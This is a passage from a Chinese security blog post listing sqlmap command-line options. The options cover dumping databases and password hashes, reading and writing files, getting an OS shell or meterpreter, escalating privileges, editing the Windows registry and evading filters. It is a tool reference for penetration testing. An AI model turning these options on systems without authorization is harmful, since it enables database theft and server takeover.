+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><span class="line">-b, –banner 检索数据库管理系统的标识</span><br><span class="line">--current-user 检索数据库管理系统当前用户</span><br><span class="line">--current-db 检索数据库管理系统当前数据库</span><br><span class="line">--is-dba 检测DBMS当前用户是否DBA</span><br><span class="line">--users 枚举数据库管理系统用户</span><br><span class="line">--passwords 枚举数据库管理系统用户密码哈希</span><br><span class="line">--privileges 枚举数据库管理系统用户的权限</span><br><span class="line">--roles 枚举数据库管理系统用户的角色</span><br><span class="line">--dbs 枚举数据库管理系统数据库</span><br><span class="line">-D DBname 要进行枚举的指定数据库名</span><br><span class="line">-T TBLname 要进行枚举的指定数据库表（如：-T tablename –columns）</span><br><span class="line">--tables 枚举的DBMS数据库中的表</span><br><span class="line">--columns 枚举DBMS数据库表列</span><br><span class="line">--dump 转储数据库管理系统的数据库中的表项</span><br><span class="line">--dump-all 转储所有的DBMS数据库表中的条目</span><br><span class="line">--search 搜索列（S），表（S）和/或数据库名称（S）</span><br><span class="line">-C COL 要进行枚举的数据库列</span><br><span class="line">-U USER 用来进行枚举的数据库用户</span><br><span class="line">--exclude-sysdbs 枚举表时排除系统数据库</span><br><span class="line">--start=LIMITSTART 第一个查询输出进入检索</span><br><span class="line">--stop=LIMITSTOP 最后查询的输出进入检索</span><br><span class="line">--first=FIRSTCHAR 第一个查询输出字的字符检索</span><br><span class="line">--last=LASTCHAR 最后查询的输出字字符检索</span><br><span class="line">--sql-query=QUERY 要执行的SQL语句</span><br><span class="line">--sql-shell 提示交互式SQL的shell</span><br><span class="line"></span><br></pre></td></tr></table></figure>
+
+
+
+<p>Optimization（优化）：</p>
+<p>这些选项可用于优化SqlMap的性能。</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">--o 开启所有优化开关</span><br><span class="line">--predict-output 预测常见的查询输出</span><br><span class="line">--keep-alive 使用持久的HTTP（S）连接</span><br><span class="line">--null-connection 从没有实际的HTTP响应体中检索页面长度</span><br><span class="line">--threads=THREADS 最大的HTTP（S）请求并发量（默认为1）</span><br><span class="line"></span><br></pre></td></tr></table></figure>
+
+
+
+<p>Injection（注入）：</p>
+<p>这些选项可以用来指定测试哪些参数， 提供自定义的注入payloads和可选篡改脚本。</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">--p TESTPARAMETER 可测试的参数（S）</span><br><span class="line">--dbms=DBMS 强制后端的DBMS为此值</span><br><span class="line">--os=OS 强制后端的DBMS操作系统为这个值</span><br><span class="line">--prefix=PREFIX 注入payload字符串前缀</span><br><span class="line">--suffix=SUFFIX 注入payload字符串后缀</span><br><span class="line">--tamper=TAMPER 使用给定的脚本（S）篡改注入数据</span><br><span class="line"></span><br></pre></td></tr></table></figure>
+
+
+
+<p>Detection（检测）：</p>
+<p>这些选项可以用来指定在SQL盲注时如何解析和比较HTTP响应页面的内容。</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">--level=LEVEL 执行测试的等级（1-5，默认为1）</span><br><span class="line">--risk=RISK 执行测试的风险（0-3，默认为1）</span><br><span class="line">--string=STRING 查询时有效时在页面匹配字符串</span><br><span class="line">--regexp=REGEXP 查询时有效时在页面匹配正则表达式</span><br><span class="line">--text-only 仅基于在文本内容比较网页</span><br><span class="line"></span><br></pre></td></tr></table></figure>
+
+
+
+<p>Techniques（技巧）：</p>
+<p>这些选项可用于调整具体的SQL注入测试。</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">--technique=TECH SQL注入技术测试（默认BEUST）</span><br><span class="line">--time-sec=TIMESEC DBMS响应的延迟时间（默认为5秒）</span><br><span class="line">--union-cols=UCOLS 定列范围用于测试UNION查询注入</span><br><span class="line">--union-char=UCHAR 用于暴力猜解列数的字符</span><br><span class="line"></span><br></pre></td></tr></table></figure>
+
+
+
+<p>Fingerprint（指纹）：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">-f, –fingerprint 执行检查广泛的DBMS版本指纹</span><br><span class="line"></span><br></pre></td></tr></table></figure>
+
+<p>Brute force（蛮力）：</p>
+<p>这些选项可以被用来运行蛮力检查。</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">--common-tables 检查存在共同表</span><br><span class="line">--common-columns 检查存在共同列</span><br><span class="line"></span><br></pre></td></tr></table></figure>
+
+<p>User-defined function injection（用户自定义函数注入）：</p>
+<p>这些选项可以用来创建用户自定义函数。</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">--udf-inject 注入用户自定义函数</span><br><span class="line">--shared-lib=SHLIB 共享库的本地路径</span><br><span class="line"></span><br></pre></td></tr></table></figure>
+
+<p>File system access（访问文件系统）：</p>
+<p>这些选项可以被用来访问后端数据库管理系统的底层文件系统。</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">--file-read=RFILE 从后端的数据库管理系统文件系统读取文件</span><br><span class="line">--file-write=WFILE 编辑后端的数据库管理系统文件系统上的本地文件</span><br><span class="line">--file-dest=DFILE 后端的数据库管理系统写入文件的绝对路径</span><br><span class="line"></span><br></pre></td></tr></table></figure>
+
+
+
+<p>Operating system access（操作系统访问）：</p>
+<p>这些选项可以用于访问后端数据库管理系统的底层操作系统。</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">--os-cmd=OSCMD 执行操作系统命令</span><br><span class="line">--os-shell 交互式的操作系统的shell</span><br><span class="line">--os-pwn 获取一个OOB shell，meterpreter或VNC</span><br><span class="line">--os-smbrelay 一键获取一个OOB shell，meterpreter或VNC</span><br><span class="line">--os-bof 存储过程缓冲区溢出利用</span><br><span class="line">--priv-esc 数据库进程用户权限提升</span><br><span class="line">--msf-path=MSFPATH Metasploit Framework本地的安装路径</span><br><span class="line">--tmp-path=TMPPATH 远程临时文件目录的绝对路径</span><br><span class="line"></span><br></pre></td></tr></table></figure>
+
+
+
+<p>Windows注册表访问：</p>
+<p>这些选项可以被用来访问后端数据库管理系统Windows注册表。</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line">--reg-read 读一个Windows注册表项值</span><br><span class="line">--reg-add 写一个Windows注册表项值数据</span><br><span class="line">--reg-del 删除Windows注册表键值</span><br><span class="line">--reg-key=REGKEY Windows注册表键</span><br><span class="line">--reg-value=REGVAL Windows注册表项值</span><br><span class="line">--reg-data=REGDATA Windows注册表键值数据</span><br><span class="line">- -reg-type=REGTYPE Windows注册表项值类型</span><br><span class="line">这些选项可以用来设置一些一般的工作参数。</span><br><span class="line">--t TRAFFICFILE 记录所有HTTP流量到一个文本文件中</span><br><span class="line">--s SESSIONFILE 保存和恢复检索会话文件的所有数据</span><br><span class="line">--flush-session 刷新当前目标的会话文件</span><br><span class="line">--fresh-queries 忽略在会话文件中存储的查询结果</span><br><span class="line">--eta 显示每个输出的预计到达时间</span><br><span class="line">--update 更新SqlMap</span><br><span class="line">--save file保存选项到INI配置文件</span><br><span class="line">--batch 从不询问用户输入，使用所有默认配置</span><br><span class="line"></span><br></pre></td></tr></table></figure>
+
+<p>Miscellaneous（杂项）：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">--beep 发现SQL注入时提醒</span><br><span class="line">--check-payload IDS对注入payloads的检测测试</span><br><span class="line">--cleanup SqlMap具体的UDF和表清理DBMS</span><br><span class="line">--forms 对目标URL的解析和测试形式</span><br><span class="line">--gpage=GOOGLEPAGE 从指定的页码使用谷歌dork结果</span><br><span class="line">--page-rank Google dork结果显示网页排名（PR）</span><br><span class="line">--parse-errors 从响应页面解析数据库管理系统的错误消息</span><br><span class="line">--replicate 复制转储的数据到一个sqlite3数据库</span><br><span class="line">--tor 使用默认的Tor（Vidalia/ Privoxy/ Polipo）代理地址</span><br><span class="line">--wizard 给初级用户的简单向导界面</span><br><span class="line"></span><br></pre></td></tr></table></figure>
+
+
+    </div>
+
+    
+    
+    
+
+      <footer class="post-footer">
+          <div class="post-tags">
+              <a href="/tags/sqlmap/" rel="tag"># sqlmap</a>
+          </div>
+
+        
+
+
+        
+    <div class="post-nav">
+      <div class="post-nav-item">
+    <a href="/2019/04/22/interview/" rel="prev" title="interview">
+      <i class="fa fa-chevron-left"></i> interview
+    </a></div>
+      <div class="post-nav-item">
+    <a href="/2019/04/22/xss-cookies/" rel="next" title="xss_cookies">
+      xss_cookies <i class="fa fa-chevron-right"></i>
+    </a></div>
+    </div>
+      </footer>
+    
+  </article>
+  
+  
+  
+
+
+
+          </div>
+          
+
+<script>
+  window.addEventListener('tabs:register', () => {
+    let { activeClass } = CONFIG.comments;
+    if (CONFIG.comments.storage) {
+      activeClass = localStorage.getItem('comments_active') || activeClass;
+    }
+    if (activeClass) {
+      let activeTab = document.querySelector(`a[href="#comment-${activeClass}"]`);
+      if (activeTab) {
+        activeTab.click();
+      }
+    }
+  });
+  if (CONFIG.comments.storage) {
+    window.addEventListener('tabs:click', event => {
+      if (!event.target.matches('.tabs-comment .tab-content .tab-pane')) return;
+      let commentClass = event.target.classList[1];
+      localStorage.setItem('comments_active', commentClass);
+    });
+  }
+</script>
+
+        </div>
+          
+  
+  <div class="toggle sidebar-toggle">
+    <span class="toggle-line toggle-line-first"></span>
+    <span class="toggle-line toggle-line-middle"></span>
+    <span class="toggle-line toggle-line-last"></span>
+  </div>
+
+  <aside class="sidebar">
+    <div class="sidebar-inner">
+
+      <ul class="sidebar-nav motion-element">
+        <li class="sidebar-nav-toc">
+          文章目录
+        </li>
+        <li class="sidebar-nav-overview">
+          站点概览
+        </li>
+      </ul>
+
+      <!--noindex-->
+      <div class="post-toc-wrap sidebar-panel">
+          <div class="post-toc motion-element"><ol class="nav"><li class="nav-item nav-level-1"><a class="nav-link" href="#%E8%BD%AC%E8%87%AAhttps-www-cnblogs-com-ichunqiu-p-5805108-html"><span class="nav-number">1.</span> <span class="nav-text">转自https:&#x2F;&#x2F;www.cnblogs.com&#x2F;ichunqiu&#x2F;p&#x2F;5805108.html</span></a></li><li class="nav-item nav-level-1"><a class="nav-link" href="#SQLMAP%E6%B3%A8%E5%85%A5%E6%95%99%E7%A8%8B-11%E7%A7%8D%E5%B8%B8%E8%A7%81SQLMAP%E4%BD%BF%E7%94%A8%E6%96%B9%E6%B3%95%E8%AF%A6%E8%A7%A3"><span class="nav-number">2.</span> <span class="nav-text">SQLMAP注入教程-11种常见SQLMAP使用方法详解</span></a><ol class="nav-child"><li class="nav-item nav-level-2"><a class="nav-link" href="#%E4%B8%80%E5%85%B1%E6%9C%8911%E7%A7%8D%E5%B8%B8%E8%A7%81SQLmap%E4%BD%BF%E7%94%A8%E6%96%B9%E6%B3%95%EF%BC%9A"><span class="nav-number">2.1.</span> <span class="nav-text">一共有11种常见SQLmap使用方法：</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#%E4%B8%80%E3%80%81SQLMAP%E7%94%A8%E4%BA%8EAccess%E6%95%B0%E6%8D%AE%E5%BA%93%E6%B3%A8%E5%85%A5"><span class="nav-number">2.1.1.</span> <span class="nav-text">一、SQLMAP用于Access数据库注入</span></a><ol class="nav-child"><li class="nav-item nav-level-4"><a class="nav-link" href="#1-%E7%8C%9C%E8%A7%A3%E6%98%AF%E5%90%A6%E8%83%BD%E6%B3%A8%E5%85%A5"><span class="nav-number">2.1.1.1.</span> <span class="nav-text">(1) 猜解是否能注入</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#2-%E7%8C%9C%E8%A7%A3%E8%A1%A8"><span class="nav-number">2.1.1.2.</span> <span class="nav-text">(2) 猜解表</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#3-%E6%A0%B9%E6%8D%AE%E7%8C%9C%E8%A7%A3%E7%9A%84%E8%A1%A8%E8%BF%9B%E8%A1%8C%E7%8C%9C%E8%A7%A3%E8%A1%A8%E7%9A%84%E5%AD%97%E6%AE%B5-%E5%81%87%E5%A6%82%E9%80%9A%E8%BF%872%E5%BE%97%E5%88%B0%E4%BA%86admin%E8%BF%99%E4%B8%AA%E8%A1%A8"><span class="nav-number">2.1.1.3.</span> <span class="nav-text">(3) 根据猜解的表进行猜解表的字段(假如通过2得到了admin这个表)</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#4-%E6%A0%B9%E6%8D%AE%E5%AD%97%E6%AE%B5%E7%8C%9C%E8%A7%A3%E5%86%85%E5%AE%B9-%E5%81%87%E5%A6%82%E9%80%9A%E8%BF%873%E5%BE%97%E5%88%B0%E5%AD%97%E6%AE%B5%E4%B8%BAusername%E5%92%8Cpassword"><span class="nav-number">2.1.1.4.</span> <span class="nav-text">(4) 根据字段猜解内容(假如通过3得到字段为username和password)</span></a></li></ol></li><li class="nav-item nav-level-3"><a class="nav-link" href="#%E4%BA%8C%E3%80%81SQLMAP%E7%94%A8%E4%BA%8ECookie%E6%B3%A8%E5%85%A5"><span class="nav-number">2.1.2.</span> <span class="nav-text">二、SQLMAP用于Cookie注入</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#%E4%B8%89%E3%80%81SQLMAP%E7%94%A8%E4%BA%8Emysql%E4%B8%ADDDOS%E6%94%BB%E5%87%BB"><span class="nav-number">2.1.3.</span> <span class="nav-text">三、SQLMAP用于mysql中DDOS攻击</span></a><ol class="nav-child"><li class="nav-item nav-level-4"><a class="nav-link" href="#1-%E8%8E%B7%E5%8F%96%E4%B8%80%E4%B8%AAShell"><span class="nav-number">2.1.3.1.</span> <span class="nav-text">(1) 获取一个Shell</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#2-%E8%BE%93%E5%85%A5%E6%89%A7%E8%A1%8C%E8%AF%AD%E5%8F%A5%E5%AE%8C%E6%88%90DDOS%E6%94%BB%E5%87%BB"><span class="nav-number">2.1.3.2.</span> <span class="nav-text">(2) 输入执行语句完成DDOS攻击</span></a></li></ol></li><li class="nav-item nav-level-3"><a class="nav-link" href="#%E5%9B%9B%E3%80%81SQLMAP%E7%94%A8%E4%BA%8Emysql%E6%B3%A8%E5%85%A5"><span class="nav-number">2.1.4.</span> <span class="nav-text">四、SQLMAP用于mysql注入</span></a><ol class="nav-child"><li class="nav-item nav-level-4"><a class="nav-link" href="#2-%E9%80%9A%E8%BF%87%E7%AC%AC%E4%B8%80%E6%AD%A5%E7%9A%84%E6%95%B0%E6%8D%AE%E5%BA%93%E6%9F%A5%E6%89%BE%E8%A1%A8-%E5%81%87%E5%A6%82%E6%95%B0%E6%8D%AE%E5%BA%93%E5%90%8D%E4%B8%BAdataname"><span class="nav-number">2.1.4.1.</span> <span class="nav-text">(2) 通过第一步的数据库查找表(假如数据库名为dataname)</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#3-%E9%80%9A%E8%BF%872%E4%B8%AD%E7%9A%84%E8%A1%A8%E5%BE%97%E5%87%BA%E5%88%97%E5%90%8D-%E5%81%87%E5%A6%82%E8%A1%A8%E4%B8%BAtable-name"><span class="nav-number">2.1.4.2.</span> <span class="nav-text">(3) 通过2中的表得出列名(假如表为table_name)</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#4-%E8%8E%B7%E5%8F%96%E5%AD%97%E6%AE%B5%E7%9A%84%E5%80%BC-%E5%81%87%E5%A6%82%E6%89%AB%E6%8F%8F%E5%87%BAid-user-password%E5%AD%97%E6%AE%B5"><span class="nav-number">2.1.4.3.</span> <span class="nav-text">(4) 获取字段的值(假如扫描出id,user,password字段)</span></a></li></ol></li><li class="nav-item nav-level-3"><a class="nav-link" href="#%E4%BA%94%E3%80%81SQLMAP%E4%B8%ADpost%E7%99%BB%E9%99%86%E6%A1%86%E6%B3%A8%E5%85%A5"><span class="nav-number">2.1.5.</span> <span class="nav-text">五、SQLMAP中post登陆框注入</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#%E5%85%AD%E3%80%81SQLMAP%E4%B8%ADGoogle%E6%90%9C%E7%B4%A2%E6%B3%A8%E5%85%A5"><span class="nav-number">2.1.6.</span> <span class="nav-text">六、SQLMAP中Google搜索注入</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#%E4%B8%83%E3%80%81SQLMAP%E4%B8%AD%E7%9A%84%E8%AF%B7%E6%B1%82%E5%BB%B6%E8%BF%9F"><span class="nav-number">2.1.7.</span> <span class="nav-text">七、SQLMAP中的请求延迟</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#%E5%85%AB%E3%80%81SQLMAP%E7%BB%95%E8%BF%87WAF%E9%98%B2%E7%81%AB%E5%A2%99"><span class="nav-number">2.1.8.</span> <span class="nav-text">八、SQLMAP绕过WAF防火墙</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#%E4%B9%9D%E3%80%81SQLMAP%E6%9F%A5%E7%9C%8B%E6%9D%83%E9%99%90"><span class="nav-number">2.1.9.</span> <span class="nav-text">九、SQLMAP查看权限</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#%E5%8D%81%E3%80%81SQLMAP%E4%BC%AA%E9%9D%99%E6%80%81%E6%B3%A8%E5%85%A5"><span class="nav-number">2.1.10.</span> <span class="nav-text">十、SQLMAP伪静态注入</span></a><ol class="nav-child"><li class="nav-item nav-level-4"><a class="nav-link" href="#1-%E6%9F%A5%E6%89%BE%E6%95%B0%E6%8D%AE%E5%BA%93"><span class="nav-number">2.1.10.1.</span> <span class="nav-text">(1) 查找数据库</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#2-%E9%80%9A%E8%BF%871%E4%B8%AD%E7%9A%84%E6%95%B0%E6%8D%AE%E5%BA%93%E6%9F%A5%E6%89%BE%E5%AF%B9%E5%BA%94%E7%9A%84%E8%A1%A8-%E5%81%87%E5%A6%82%E9%80%9A%E8%BF%871%EF%BC%8C%E5%BE%97%E5%88%B0%E7%9A%84%E6%98%AFdataname"><span class="nav-number">2.1.10.2.</span> <span class="nav-text">(2) 通过1中的数据库查找对应的表 (假如通过1，得到的是dataname)</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#3-%E9%80%9A%E8%BF%872%E4%B8%AD%E7%9A%84%E6%95%B0%E6%8D%AE%E8%A1%A8%E5%BE%97%E5%88%B0%E5%AD%97%E6%AE%B5-%E5%81%87%E5%A6%82%E5%BE%97%E5%88%B0%E7%9A%84%E6%98%AFtablename%E8%A1%A8"><span class="nav-number">2.1.10.3.</span> <span class="nav-text">(3) 通过2中的数据表得到字段(假如得到的是tablename表)</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#4-%E9%80%9A%E8%BF%873%E5%BE%97%E5%88%B0%E5%AD%97%E6%AE%B5%E5%80%BC-%E5%81%87%E5%A6%82%E4%BB%8E3%E4%B8%AD%E5%BE%97%E5%88%B0%E5%AD%97%E6%AE%B5id%EF%BC%8Cpassword"><span class="nav-number">2.1.10.4.</span> <span class="nav-text">(4) 通过3得到字段值(假如从3中得到字段id，password)</span></a></li></ol></li><li class="nav-item nav-level-3"><a class="nav-link" href="#%E5%8D%81%E4%B8%80%E3%80%81SQLMAP%E6%B3%A8%E5%85%A5%E7%82%B9%E6%89%A7%E8%A1%8C%E5%91%BD%E4%BB%A4%E4%B8%8E%E4%BA%A4%E4%BA%92%E5%86%99shell"><span class="nav-number">2.1.11.</span> <span class="nav-text">十一、SQLMAP注入点执行命令与交互写shell</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#1-%E6%B3%A8%E5%85%A5%E7%82%B9%EF%BC%9Ahttp-192-168-159-1-news-php-id-1"><span class="nav-number">2.1.12.</span> <span class="nav-text">(1) 注入点：http:&#x2F;&#x2F;192.168.159.1&#x2F;news.php?id&#x3D;1</span></a></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#Tips"><span class="nav-number">2.2.</span> <span class="nav-text">Tips:</span></a></li></ol></li><li class="nav-item nav-level-1"><a class="nav-link" href="#sqlmap%E8%AF%A6%E7%BB%86%E5%91%BD%E4%BB%A4%EF%BC%9A"><span class="nav-number">3.</span> <span class="nav-text">sqlmap详细命令：</span></a></li></ol></div>
+      </div>
+      <!--/noindex-->
+
+      <div class="site-overview-wrap sidebar-panel">
+        <div class="site-author motion-element" itemprop="author" itemscope itemtype="http://schema.org/Person">
+    <img class="site-author-image" itemprop="image" alt="Erlee"
+      src="/images/erlee.png">
+  <p class="site-author-name" itemprop="name">Erlee</p>
+  <div class="site-description" itemprop="description"></div>
+</div>
+<div class="site-state-wrap motion-element">
+  <nav class="site-state">
+      <div class="site-state-item site-state-posts">
+          <a href="/archives/">
+        
+          <span class="site-state-item-count">7</span>
+          <span class="site-state-item-name">日志</span>
+        </a>
+      </div>
+      <div class="site-state-item site-state-categories">
+            <a href="/categories/">
+        <span class="site-state-item-count">6</span>
+        <span class="site-state-item-name">分类</span></a>
+      </div>
+      <div class="site-state-item site-state-tags">
+            <a href="/tags/">
+        <span class="site-state-item-count">6</span>
+        <span class="site-state-item-name">标签</span></a>
+      </div>
+  </nav>
+</div>
+
+
+
+      </div>
+
+    </div>
+  </aside>
+  <div id="sidebar-dimmer"></div>
+
+
+      </div>
+    </main>
+
+    <footer class="footer">
+      <div class="footer-inner">
+        
+
+        
+  <div class="beian"><a href="https://beian.miit.gov.cn/" rel="noopener" target="_blank">豫ICP备 19040334号-1 </a>
+  </div>
+
+<div class="copyright">
+  
+  &copy; 
+  <span itemprop="copyrightYear">2021</span>
+  <span class="with-love">
+    <i class="fa fa-heart"></i>
+  </span>
+  <span class="author" itemprop="copyrightHolder">Erlee</span>
+</div>
+  <div class="powered-by">由 <a href="https://hexo.io/" class="theme-link" rel="noopener" target="_blank">Hexo</a> & <a href="https://muse.theme-next.org/" class="theme-link" rel="noopener" target="_blank">NexT.Muse</a> 强力驱动
+  </div>
+
+        
+
+
+
+
+
+
+
+
+      </div>
+    </footer>
+  </div>
+
+  
+  
+  <script color='0,0,0' opacity='0.5' zIndex='-1' count='150' src="/lib/canvas-nest/canvas-nest.min.js"></script>
+  <script src="/lib/anime.min.js"></script>
+  <script src="/lib/velocity/velocity.min.js"></script>
+  <script src="/lib/velocity/velocity.ui.min.js"></script>
+
+<script src="/js/utils.js"></script>
+
+<script src="/js/motion.js"></script>
+
+
+<script src="/js/schemes/muse.js"></script>
+
+
+<script src="/js/next-boot.js"></script>
+
+
+
+
+  
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+  
+
+  
+
+</body>
+</html>
